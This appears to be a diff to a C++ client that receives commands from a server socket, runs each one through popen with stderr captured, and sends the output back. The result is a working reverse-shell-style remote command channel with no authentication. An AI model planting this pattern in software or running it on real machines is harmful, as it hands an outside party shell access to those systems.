@@ -6,6 +6,8 @@
 #include <arpa/inet.h>
 #include <cstring>
 #include <vector>
+#include <array>
+#include <memory>
 
 Client::Client(const std::string address, uint port) : address(address), port(port), clientSocket(-1), state(false) {}
 
@@ -59,13 +61,11 @@ void Client::control() {
         std::cout << "command: " << command << std::endl;
 
         //TODO Call executeCommand function
+        std::string output = executeCommand(command);
+
         //TODO Call sendOutput function
-        sendOutput(clientSocket, command);
+        sendOutput(clientSocket, output);
     }
-}
-
-std::string Client::executeCommand(std::string &command) {
-
 }
 
 void Client::receive(std::string &message) {
@@ -95,14 +95,32 @@ void Client::receive(std::string &message) {
     message.assign(buffer.begin(), buffer.end());
 }
 
+std::string Client::executeCommand(const std::string &command) {
+    std::string commandRedirect = command + " 2>&1"; // Capture stdout and stderr
+    std::array<char, 128> buffer;
+    std::string result;
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(commandRedirect.c_str(), "r"), pclose);
+
+    if (!pipe) {
+        return "popen() failed";
+    }
+
+    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
+
 void Client::sendOutput(int serverSocket, std::string &message) {
     uint len = htonl(message.length());
 
+    // Send message length
     if (send(serverSocket, &len, sizeof(len), 0) == -1) {
         perror("send");
         return;
     }
 
+    // Send message
     if (send(serverSocket, message.c_str(), message.length(), 0) == -1) {
         perror("send");
         return;
